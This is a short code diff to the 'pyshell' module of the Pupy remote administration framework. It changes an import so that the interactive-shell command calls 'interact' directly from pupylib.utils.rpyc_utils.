@@ -4,7 +4,7 @@ import sys
 import subprocess
 import threading
 import Queue
-import pupylib.utils
+from pupylib.utils.rpyc_utils import interact
 
 import time
 
@@ -22,7 +22,7 @@ class InteractivePythonShell(PupyModule):
 		self.arg_parser = PupyArgumentParser(prog='pyshell', description=self.__doc__)
 	def run(self, args):
 		try:
-			pupylib.utils.interact(self.client.conn)
+			interact(self.client.conn)
 		except KeyboardInterrupt:
 			pass
 
